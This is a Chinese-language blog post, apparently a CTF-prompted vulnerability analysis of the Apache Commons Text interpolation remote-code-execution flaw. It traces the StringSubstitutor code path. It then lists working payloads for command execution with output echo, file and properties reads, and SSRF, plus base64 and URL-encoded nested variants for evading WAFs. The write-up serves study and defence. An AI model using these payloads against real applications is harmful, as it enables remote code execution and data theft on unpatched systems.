---
title: "Apache Commons Text RCE 漏洞分析"
date: 2023-01-09T10:04:05+08:00
lastmod: 2023-01-09T10:04:05+08:00
draft: false
author: "X1r0z"

tags: ['rce']
categories: ['Java安全']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

打 rwctf 体验赛遇到的, 顺带写一下

总体感觉跟 log4j2 jndi 注入的利用方式很像, 毕竟都是 apache 的库

<!--more-->

## 漏洞分析

> The Commons Text library provides additions to the standard JDK's text handling. Our goal is to provide a consistent set of tools for processing text generally from computing distances between Strings to being able to efficiently do String escaping of various type

官方文档: [https://commons.apache.org/proper/commons-text/userguide.html](https://commons.apache.org/proper/commons-text/userguide.html)

影响版本: 1.5.0 - 1.9

添加依赖

```xml
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-text</artifactId>
    <version>1.9</version>
</dependency>
```

demo

```java
package com.example;

import org.apache.commons.text.StringSubstitutor;

public class Demo {
    public static void main(String[] args) throws Exception{
        StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
        String code = "${script:js:java.lang.Runtime.getRuntime().exec(\"calc\")}";
        String res = interpolator.replace(code);
        System.out.println(res);
    }
}
```

![image-20230107133023404](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301071330605.png)

在 `interpolator.replace(code)` 处打个断点开始调试

首先进入 `StringSubstitutor#replace`

![image-20230107133140719](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301071331766.png)

跟进 substitute 方法

![image-20230107133234123](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301071332180.png)

prefixMatcher 和 suffixMacher 分别为 `${` 和 `}`, 用于标记插值表达式

valueDelimMatcher 的值为 `:-`, 这里我一开始以为它能够跟 log4j2 一样通过 `${a:-j}ndi` 来拼接关键词, 但后来发现实际上并不支持这种使用方式, 一时半会也没想出来怎么去利用...

后面是一堆循环和 if 来解析表达式

![image-20230107145231029](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301071452066.png)

然后会来到 `this.resolveVariable` 这个方法

![image-20230107145435771](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301071454945.png)

这里有一个 stringLookupMap, 里面对应了很多 lookup class, 后续利用也都是从这些 class 来入手

![image-20230107145926441](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301071459485.png)

默认的 InterpolatorStringLookup 会截取 prefix, 然后从 stringLookupMap 中取得对应的 lookup class 并调用其 lookup 方法

![image-20230107150041258](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301071500325.png)

ScriptStringLookup 会截取 engineName 和 script, 然后创建对应的 ScriptEngine

在 return 的时候会调用 `scriptEngine.eval(script)` 从而造成任意代码执行

## 利用方式

官方文档中给出的几种 lookup 方式

[https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/StringSubstitutor.html](https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/StringSubstitutor.html)

[https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/lookup/StringLookupFactory.html](https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/lookup/StringLookupFactory.html)
![image-20230107144624100](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301071446141.png)

![image-20230107150736186](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301071507233.png)

基本所有的利用方法都已经在这篇文章里面给出了, 总结的很全

[https://forum.butian.net/share/1973](https://forum.butian.net/share/1973)

下面就举出几个常用的 lookup class 来分析一下

### ScriptStringLookup

很简单的利用 ScriptEngineManager 来执行命令, 上面已经分析过了

![image-20230107152440601](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301071524699.png)

常规的弹计算器

```java
${script:js:java.lang.Runtime.getRuntime().exec("calc")}
```

结合 Scanner 或者 BufferedReader 实现回显

```java
${script:js:new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.ProcessBuilder("whoami").start().getInputStream(), "GBK")).readLine()} // 只能读取一行

${script:js:new java.util.Scanner(new java.lang.ProcessBuilder("ipconfig").start().getInputStream(), "GBK").useDelimiter("xzxzxz").next()}
```

注意类名要写全 (包括 `java.lang`)

### ResourceBundleStringLookup

ResourceBundle 的利用方式最初是在浅蓝师傅的这篇文章中学到的

[https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg](https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg)

利用它可以读取 classpath 下的 `.properties` 配置文件, 无需知道绝对路径

一个很经典的例子就是 springboot 的 `application.properties` 文件

```java
${resourcebundle:application:user.name}
```

![image-20230107153145960](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301071531064.png)

### FileStringLookup

读取文件

需要指定 charsetname

![image-20230107153614916](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301071536990.png)

```java
${file:utf-8:d:/test.txt}
```

![image-20230107153722041](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301071537153.png)

### UrlStringLookup

发起 url 请求

同样需要指定 charsetname

![image-20230107153822318](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301071538383.png)

可以利用 http 和 file 协议, 造成 ssrf 或者读取本地文件

```
${url:utf-8:http://127.0.0.1:8000/}

${url:utf-8:file:///d:/test.txt}
```

![image-20230107154058731](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301071540923.png)

## 编码绕过

主要利用 urlDecoder 和 base64Decoder

![image-20230107154635648](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301071546705.png)

![image-20230107154703586](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301071547638.png)

原因在于 `StringSubstitutor#substitute` 支持递归解析

![image-20230107155022602](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301071550727.png)

所以可以利用编码 + 嵌套的方式来绕过某些 waf 对 prefix 的检测

base64Decoder

```java
package com.example;

import org.apache.commons.text.StringSubstitutor;

import java.util.Base64;

public class Demo {
    public static void main(String[] args) throws Exception{
        StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
        String code = "${script:js:java.lang.Runtime.getRuntime().exec(\"calc\")}";
        String poc = "${base64Decoder:" + Base64.getEncoder().encodeToString(code.getBytes()) + "}";
        String res = interpolator.replace(poc);
        System.out.println(res);
    }
}
```

```java
${base64Decoder:JHtzY3JpcHQ6anM6amF2YS5sYW5nLlJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoImNhbGMiKX0=}
```

![image-20230107155231900](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301071552001.png)

urlDecoder

```java
${urlDecoder:%24%7b%73%63%72%69%70%74%3a%6a%73%3a%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%7d}
```

![image-20230107155655319](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301071556427.png)

当然多套几层也是可以的

## 参考文章

[https://paper.seebug.org/2025/](https://paper.seebug.org/2025/)

[https://paper.seebug.org/1993/](https://paper.seebug.org/1993/)

[https://forum.butian.net/share/1973](https://forum.butian.net/share/1973)

[https://blog.csdn.net/qq_34101364/article/details/127338170](https://blog.csdn.net/qq_34101364/article/details/127338170)
